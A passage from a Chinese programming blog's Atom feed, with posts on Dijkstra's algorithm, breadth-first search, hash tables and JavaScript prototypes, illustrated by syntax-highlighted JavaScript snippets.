pass</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> initData[start]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按距离从小到大进行排序，传入对象（数组），返回数组，会改变原数据</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sortData</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(data <span class="keyword">instanceof</span> <span class="title class_">Array</span>)) &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = []</span><br><span class="line">    <span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123;</span><br><span class="line">      arr.<span class="title function_">push</span>(data[key])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> a.<span class="property">instance</span> - b.<span class="property">instance</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a.<span class="property">instance</span> - b.<span class="property">instance</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迪杰斯特拉</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dijkstra</span>(<span class="params">data, startPoint, targetPoint</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> allPoint = <span class="keyword">new</span> <span class="title class_">Set</span>([...targetPoint, startPoint])</span><br><span class="line">    <span class="comment">// 获取全部点的散列表</span></span><br><span class="line">  <span class="keyword">let</span> initData = <span class="title function_">pointDistanceHashTable</span>(data, allPoint);</span><br><span class="line">  <span class="comment">// 将起点单独提取出来，用于遍历, 大小比较</span></span><br><span class="line">  <span class="keyword">let</span> startPointData = initData[startPoint];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 按初始路径长短顺序进行路径分析</span></span><br><span class="line">  <span class="keyword">return</span> (analyse = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (startPointData.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      initData[startPoint].<span class="property">start</span> = startPoint <span class="comment">//给他一个名字</span></span><br><span class="line">      <span class="keyword">return</span> initData[startPoint]</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      startPointData = <span class="title function_">sortData</span>(startPointData) <span class="comment">//排序</span></span><br><span class="line">      <span class="comment">// 遍历更新数据</span></span><br><span class="line">      <span class="keyword">for</span> (next <span class="keyword">in</span> initData[startPointData[<span class="number">0</span>].<span class="property">target</span>]) &#123;</span><br><span class="line">        <span class="comment">// 排除掉绕圈</span></span><br><span class="line">        <span class="keyword">if</span> (next != startPoint) &#123;</span><br><span class="line">          <span class="comment">// 更新掉initData的数据</span></span><br><span class="line">          <span class="title function_">longer</span>(initData, startPoint, startPointData[<span class="number">0</span>].<span class="property">target</span>, next)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      startPointData.<span class="title function_">shift</span>() <span class="comment">//移除当前数据</span></span><br><span class="line">      <span class="comment">// 继续迭代</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">analyse</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 途径函数，传入算法计算结果的数据，以及要到达的终点，返回文字提示</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">roadPoint</span>(<span class="params">data, end</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!data[end]) <span class="keyword">return</span> <span class="string">&#x27;无到达该点的最短距离数据&#x27;</span></span><br><span class="line">  <span class="keyword">let</span> pass = [end]</span><br><span class="line">  <span class="keyword">let</span> instanceText = <span class="string">&#x27;从&#x27;</span> + data.<span class="property">start</span> + <span class="string">&#x27;到&#x27;</span> + end + <span class="string">&#x27;的距离为&#x27;</span> + data[end].<span class="property">instance</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 迭代</span></span><br><span class="line">  <span class="keyword">return</span> (get = <span class="keyword">function</span>(<span class="params">end</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[end].<span class="property">process</span> == data.<span class="property">start</span>) &#123;</span><br><span class="line">      pass.<span class="title function_">unshift</span>(data.<span class="property">start</span>)</span><br><span class="line">      <span class="keyword">return</span> instanceText + <span class="string">&#x27;,完整路径为&#x27;</span> + pass</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      pass.<span class="title function_">unshift</span>(data[end].<span class="property">process</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">get</span>(data[end].<span class="property">process</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)(end)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>要计算非加权图中的最短路径，可使用广度优先搜索。要计算加权图中的最短路径，可使用狄克斯特拉算法</li><li>狄克斯特拉算法用于在加权图中查找最短路径。 </li><li>仅当权重为正时狄克斯特拉算法才管用。 </li><li>如果图中包含负权边，请使用贝尔曼福德算法。</li></ol>]]></content>
    
    <summary type="html">
    
      迪杰斯特拉算法主要特点是从起始点开始，采用贪心算法的策略，每次遍历到始点距离最近且未访问过的顶点的邻接节点，直到扩展到终点为止
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>广度优先搜索</title>
    <link href="http://dong-666.github.io/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"/>
    <id>http://dong-666.github.io/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</id>
    <published>2021-10-01T12:00:00.000Z</published>
    <updated>2022-03-02T08:26:26.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>宽度优先<a href="https://baike.baidu.com/item/搜索算法/2988274">搜索算法</a>（又称广度优先搜索）是最简便的图的搜索算法之一，这一算法也是很多重要的图的算法的原型。Dijkstra<a href="https://baike.baidu.com/item/单源最短路径/6975204">单源最短路径</a>算法和Prim<a href="https://baike.baidu.com/item/最小生成树">最小生成树</a>算法都采用了和宽度优先搜索类似的思想。其别名又叫BFS，属于一种盲目搜寻法，目的是系统地展开并检查图中的所有节点，以找寻结果。换句话说，它并不考虑结果的可能位置，彻底地搜索整张图，直到找到结果为止</p></blockquote><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p>广度优先搜索的运行时间为O(顶点 + 边数)，这通常写作O(V + E)，其中V为顶点（vertice）数，E为边数</p><p>对于检查过的人（顶点），务必不要再去检查，否则可能导致无限循环</p><h2 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h2><ol><li>使用图来建立问题模型</li><li>使用广度优先搜索解决问题</li></ol><h2 id="有向图、无向图"><a href="#有向图、无向图" class="headerlink" title="有向图、无向图"></a>有向图、无向图</h2><p>有向图是单向的</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/image-20210904144514052.png" alt="image-20210904144514052"></p><p>无向图没有箭头，直接相连的节点互为邻居，无向图相邻的两个结点彼此指向对方，其实就是一个环，跟上图一样</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>有这么一个人员数据表，他们都有各自的<strong>职业</strong>和<strong>邻居</strong>，假设你是其中一个人：a——工地搬砖工。有一天，你想吃新鲜的蔬菜，但是你不相信陌生人，所以你打算问你的邻居，看看有没有什么认识的人（职业为农民）可以提供保证新鲜的蔬菜给你，如何操作呢（下面为思路）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">a</span>: &#123;</span><br><span class="line">    <span class="attr">neighbor</span>: [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">    <span class="attr">profession</span>: <span class="string">&#x27;worker&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">neighbor</span>: [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>],</span><br><span class="line">    <span class="attr">profession</span>: <span class="string">&#x27;panter&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">c</span>: &#123;</span><br><span class="line">    <span class="attr">neighbor</span>: [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">    <span class="attr">profession</span>: <span class="string">&#x27;teacher&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">d</span>: &#123;</span><br><span class="line">    <span class="attr">neighbor</span>: [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;e&#x27;</span>],</span><br><span class="line">    <span class="attr">profession</span>: <span class="string">&#x27;doctor&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">e</span>: &#123;</span><br><span class="line">    <span class="attr">neighbor</span>: [<span class="string">&#x27;d&#x27;</span>],</span><br><span class="line">    <span class="attr">profession</span>: <span class="string">&#x27;police&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">f</span>: &#123;</span><br><span class="line">    <span class="attr">neighbor</span>: [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>],</span><br><span class="line">    <span class="attr">profession</span>: <span class="string">&#x27;farmer&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">g</span>: &#123;</span><br><span class="line">    <span class="attr">neighbor</span>: [<span class="string">&#x27;b&#x27;</span>],</span><br><span class="line">    <span class="attr">profession</span>: <span class="string">&#x27;programmer&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据广度优先搜素算法，我们首先根据各个人员的邻居构建出图模型</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/image-20210904145548745.png" alt="image-20210904145548745"></p><p>接着就是从你（a）自己入手，首先你从b和c开始找起，如若b和c就是农民，那么久返回该对象的名字,我们可以将这两人压入待查找数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[b,c];</span><br></pre></td></tr></table></figure><p>b如果不是，那么就把b的邻居加入数组，一起找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[b,c,a,f,g];</span><br></pre></td></tr></table></figure><p>同时把b弹出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[c,a,f,g];</span><br></pre></td></tr></table></figure><p>当然，a也不是，否则查找会造成循环，不断去找a，所以一开始我们需要定义一个数组用以存储已查过的对象，然后每次查完一个放进一个，后面的每次查找待找数组时在已查找数组中查看是否已查过，是则把该值从待找数组中丢掉</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> finded = [<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><p>继续上面几个步骤，对后面的数据进行查找↓</p><p>接下来是c，c也不是，所以把c的邻居也加进来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a,f,g,a,f,d];</span><br></pre></td></tr></table></figure><p>重复这几个步骤，直到找出最终的结果</p><p>方法代码如下</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/carbon.png" alt="carbon"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>广度优先搜索指出是否有从A到B的路径。</li><li>如果有，广度优先搜索将找出最短路径。</li><li>面临类似于寻找最短路径的问题时，可尝试使用图来建立模型，再使用广度优先搜索来 解决问题。</li><li>有向图中的边为箭头，箭头的方向指定了关系的方向，例如，rama→adit表示rama欠adit钱。 </li><li>无向图中的边不带箭头，其中的关系是双向的，例如，ross - rachel表示“ross与rachel约 会，而rachel也与ross约会”。</li><li>队列是先进先出（FIFO）的。 </li><li>栈是后进先出（LIFO）的。</li><li>你需要按加入顺序检查搜索列表中的人，否则找到的就不是最短路径，因此搜索列表必 须是队列。 </li><li>对于检查过的人，务必不要再去检查，否则可能导致无限循环。</li></ol>]]></content>
    
    <summary type="html">
    
      宽度优先搜索算法（又称广度优先搜索）是最简便的图的搜索算法之一，这一算法也是很多重要的图的算法的原型
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>散列表</title>
    <link href="http://dong-666.github.io/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/"/>
    <id>http://dong-666.github.io/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/</id>
    <published>2021-08-30T08:00:00.000Z</published>
    <updated>2022-03-02T08:26:48.472Z</updated>
    
    <content type="html"><![CDATA[<p>必看：<a href="https://zhuanlan.zhihu.com/p/95156642">来吧！一文彻底搞定哈希表！</a></p><p>进阶：<a href="https://baike.baidu.com/item/哈希表/5981869?fr=aladdin">哈希表_百度百科 (baidu.com)</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><a href="https://baike.baidu.com/item/散列表/10027933">散列表</a>（Hash table，也叫哈希表），是根据关键码值(Key value)而直接进行访问的<a href="https://baike.baidu.com/item/数据结构/1450">数据结构</a>。也就是说，它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射函数叫做<a href="https://baike.baidu.com/item/散列函数/2366288">散列函数</a>，存放记录的<a href="https://baike.baidu.com/item/数组/3794097">数组</a>叫做<a href="https://baike.baidu.com/item/散列表/10027933">散列表</a>。</p><p>给定表M，存在函数f(key)，对任意给定的关键字值key，代入函数后若能得到包含该关键字的记录在表中的地址，则称表M为哈希(Hash）表，函数f(key)为哈希(Hash) 函数。</p></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/image-20210904161554231.png" alt="image-20210904161554231"></p><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><ul><li>一种功能强大的数据结构，其操作速度快，还能以不同的方式建立数据模型</li><li>一种包含额外逻辑的数据结构</li><li>也被称为散列映射、映射、字典和<br>关联数组</li><li>散列表的查找、插入和删除速度都非常快</li></ul><h3 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h3><ul><li>查找（模拟映射关系）</li><li>防止重复</li><li>用作缓存</li></ul><h3 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h3><h4 id="什么是冲突"><a href="#什么是冲突" class="headerlink" title="什么是冲突"></a>什么是冲突</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/image-20220216142535367.png" alt="image-20220216142535367"></p><blockquote><p>冲突很糟糕，应使用可以最大限度减少冲突的散列函数</p></blockquote><p>避免方法：</p><ol><li>较低的填装因子<ul><li>填装因子越低，发生冲突的可能性越小，<br>散列表的性能越高</li><li>经验：一旦填装因子大于0.7，就调整散列表的长度</li><li>虑到调整长度所需的时间，散列表操作所需的时间也为O(1)</li></ul></li><li>良好的散列函数<ul><li>良好的散列函数让数组中的值呈均匀分布</li><li>糟糕的散列函数让值扎堆，导致大量的冲突</li><li>散列函数的结果必须是均匀分布的，这很重要。它们的映射范围必须尽可能大。最糟糕的散列函数莫过于将所有输入都映射到散列表的同一个位置</li></ul></li></ol><h2 id="散列函数"><a href="#散列函数" class="headerlink" title="散列函数"></a>散列函数</h2><ol><li>散列函数总是将同样的输入映射到相同的索引。</li><li>散列函数将不同的输入映射到不同的索引。</li><li>散列函数知道数组有多大，只返回有效的索引。如果数组包含5个元素，散列函数就不会返回无效索引100</li></ol><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="伪散列函数查找商品价格"><a href="#伪散列函数查找商品价格" class="headerlink" title="伪散列函数查找商品价格"></a>伪散列函数查找商品价格</h3><p>功能：</p><ol><li>添加商品及其价格</li><li>输入商品，得到其价格</li></ol><p>思路：</p><ol><li>使用类存储</li><li>获取商品价格方法<ul><li>通过遍历已有商品得到其价格并返回出去</li></ul></li><li>添加商品方法<ul><li>通过添加商品将该数据添加到对象中</li></ul></li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/6130935fe401fd1fb6a2dfb5.png" alt="6130935fe401fd1fb6a2dfb5"></p><h3 id="模拟散列表"><a href="#模拟散列表" class="headerlink" title="模拟散列表"></a>模拟散列表</h3><p>该散列表默认按照最高长度为24来进行字符串存储</p><p>slots用于初始化散列表时的数据存储</p><ul><li>add方法<ul><li>得到当前传入值的字符串长度</li><li>判断当前长度对应的数组位置是否还未开辟出新的数组，是则开辟出新的内存地址</li><li>将当前字符串添加到散列表（slots）中去</li></ul></li><li>delete方法<ul><li>从散列表中查找该字符串长度对应的数组位置</li><li>获得该元素在该数组（对应字符串长度的数组）中的<strong>位置</strong></li><li>将该数据从散列表中数组对应的位置删除</li></ul></li><li>get方法<ul><li>通过<strong>过滤函数（filter）</strong>将数据从散列表中取出来，并返回该值</li></ul></li></ul><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/613095421efad40d9391d4ad.png" alt="613095421efad40d9391d4ad"></p>]]></content>
    
    <summary type="html">
    
      是根据关键码值(Key value)而直接进行访问的一种数据结构
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>js原型小记（大记）</title>
    <link href="http://dong-666.github.io/2021/08/22/%E5%8E%9F%E5%9E%8B/"/>
    <id>http://dong-666.github.io/2021/08/22/%E5%8E%9F%E5%9E%8B/</id>
    <published>2021-08-22T08:00:00.000Z</published>
    <updated>2022-03-04T08:44:41.996Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原型、原型链、-proto-、prototype"><a href="#原型、原型链、-proto-、prototype" class="headerlink" title="原型、原型链、__proto__、prototype"></a>原型、原型链、__proto__、prototype</h1><blockquote><p>在以类为中心的面向对象编程语言中，类和对象的关系可以想象成铸模和铸件的关系，对象总是从类中创建而来。而在原型编程的思想中，类并不是必需的，对象未必需要从类中创建而来，一个对象是通过克隆另外一个对象所得到的。</p></blockquote><p>也就是说，在js中，我们是可以通过克隆创造世界，看下面的代码，首先我们创建一个构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">User</span> = <span class="keyword">function</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name,</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age,</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">getName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>在这里，我们声明了一个构造函数，暂且将它想象成类，然后我们来new一个对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> admin = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;Admin&#x27;</span>, <span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>我们创造了一个admin对象，接着，如果有一个admin和上面所创造的对象同名同年龄时，我们该怎么创建呢，有人说：这还不简单嘛，再new一个不就得了，确实，在这里new一个难度不大，但当我们构造同一个对象需要的参数很多时，那又该怎么办，按着原来的参数继续new吗</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">User</span> = <span class="keyword">function</span>(<span class="params">name, age, height, weigt</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name,</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age,</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">height</span> = height,</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">weight</span> = weight,</span><br><span class="line">  <span class="comment">//... 还有其它很多的属性</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 已经创建了一个对象</span></span><br><span class="line"><span class="keyword">let</span> admin = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;Admin&#x27;</span>, <span class="number">18</span>,<span class="number">177</span> ,<span class="number">110</span>,...)</span><br><span class="line"><span class="comment">// 要再创建同个对象</span></span><br></pre></td></tr></table></figure><p>这样的参数要我们一个一个填进去，但我们已经新建了一个完全的一样的对象，而且这样子做还要防止参数一不小心填错导致对象不同</p><p>所以我们采用克隆的方式来创造一个一模一样的对象，ECMAScript 5提供了Object.create 方法，可以用来克隆对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cloneAdmin = <span class="title class_">Object</span>.<span class="title function_">create</span>( admin); </span><br></pre></td></tr></table></figure><p>这，便是js的克隆，在这时候，cloneAdmin.__proto__会指向admin，__proto__是啥，后面我们会提到，这里你只需要知道，这时候的cloneAdmin已经继承admin几乎所有属性包括方法了</p><h2 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a>原型和原型链</h2><p>我们再来了解下原型和原型链，什么是原型，就像上面举的例子，cloneAdmin是通过admin克隆而来的，那么它的原型便是admin，如果现在有一个对象clone2，克隆自cloneAdmin，那么clone2的原型便是cloneAdmin，而从它到admin这一条线上的所有对象便是原型链</p><blockquote><p>js的继承：基于原型链的委托机制就是原型继承的本质</p></blockquote><p>如何理解这句话，我们继续上面的例子，现在cloneAdmin克隆自admin，那么它是可以使用admin的所有属性和方法的，前提是它没有覆盖掉原型的方法，这类似于我们学习其它语言的继承特性</p><p>所以我们也就可以知道：<strong>当对象无法响应某个请求时，会把该请求委托给它自己的原型</strong></p><p>所以，通过以上，可以得出：原型编程范型至少包括以下基本规则</p><ul><li>所有的数据都是对象</li><li>要得到一个对象，不是通过实例化类，而是找到一个对象作为原型并克隆它</li><li>对象会记住它的原型</li><li>如果对象无法响应某个请求，它会把这个请求委托给它自己的原型</li></ul><h2 id="所有的数据都是对象"><a href="#所有的数据都是对象" class="headerlink" title="所有的数据都是对象"></a>所有的数据都是对象</h2><p>JavaScript 中的根对象是 Object.prototype 对象。Object.prototype 对象是一个空的对象。我们在 JavaScript 遇到的每个对象，实际上都是从 Object.prototype 对象克隆而来的， Object.prototype 对象就是它们的原型。</p><p>在 JavaScript 语言里，我们并不需要关心克隆的细节，因为这是引擎内部负责实现的。</p><h2 id="JS的克隆"><a href="#JS的克隆" class="headerlink" title="JS的克隆"></a>JS的克隆</h2><p>JavaScript 的函数既可以作为普通函数被调用， 也可以作为构造器被调用。当使用 new 运算符来调用函数时，此时的函数就是一个构造器。 用 new 运算符来创建对象的过程，实际上也只是先克隆 Object.prototype 对象，再进行一些其他额外操作的过程。</p><h2 id="对象会记住它的原型"><a href="#对象会记住它的原型" class="headerlink" title="对象会记住它的原型"></a>对象会记住它的原型</h2><p>JavaScript 给对象提供了一个名为__proto__的隐藏属性，某个对象的__proto__属性默认会指向它的构造器的原型对象，即{Constructor}.prototype。</p><p>__proto__就是对象跟“对象构造器的原型”联系起来的纽带。（__proto__：指向该对象的构造函数的原型对象，prototype指向该构造函数的原型对象——来自<a href="https://www.zhihu.com/question/34183746/answer/58155878">知乎</a>，强烈建议阅读该文章）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic3.zhimg.com/80/e83bca5f1d1e6bf359d1f75727968c11_720w.jpg?source=1940ef5c" alt="img"></p><h2 id="对象委托"><a href="#对象委托" class="headerlink" title="对象委托"></a>对象委托</h2><p>JavaScript 的对象最初都是由 Object.prototype 对象克隆而来的，但对象构造器的原型并不仅限于 Object.prototype 上，而是可以动态指向其他对象。</p><p>如：我们可以创建一个无原型的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一参数为原型指向，第二个为对象属性编辑</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">  <span class="attr">name</span>: &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="string">&#x27;hhh&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>原型链并不是无限长的，当对象通过原型链找某个属性找到根节点而找不到时，则会返回undefined（Object.prototype 的原型是 null）</p><h1 id="基于原型的继承以及constructor"><a href="#基于原型的继承以及constructor" class="headerlink" title="基于原型的继承以及constructor"></a>基于原型的继承以及constructor</h1><p>通过上面，我们可以知道继承是可以通过原型实现，通过上面的继承原型图，我们进行相应的练习</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic3.zhimg.com/80/e83bca5f1d1e6bf359d1f75727968c11_720w.jpg?source=1940ef5c" alt="img"></p><p>首先创建构造函数User</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">User</span> (name, age) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">getDetail</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">`我叫<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>，今年<span class="subst">$&#123;<span class="variable language_">this</span>.age&#125;</span>岁了`</span></span><br><span class="line">  &#125;</span><br><span 